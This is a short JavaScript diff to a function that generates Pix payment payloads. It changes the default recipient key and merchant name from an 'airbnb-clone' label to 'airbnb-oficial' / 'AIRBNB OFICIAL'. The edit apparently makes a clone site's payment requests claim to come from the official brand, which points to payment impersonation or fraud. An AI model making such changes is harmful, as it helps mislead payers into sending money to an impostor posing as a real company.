@@ -19,8 +19,8 @@ function emvFormat(id, value) {
 }
 
 export function generatePixPayload({ key, name, city, amount, txid = '***' }) {
-  const cleanKey = key || 'contato@airbnb-clone.com.br';
-  const cleanName = (name || 'AIRBNB CLONE').substring(0, 25);
+  const cleanKey = key || 'contato@airbnb-oficial.com.br';
+  const cleanName = (name || 'AIRBNB OFICIAL').substring(0, 25);
   const cleanCity = (city || 'SAO PAULO').substring(0, 15);
   const cleanAmount = Number(amount).toFixed(2);
 
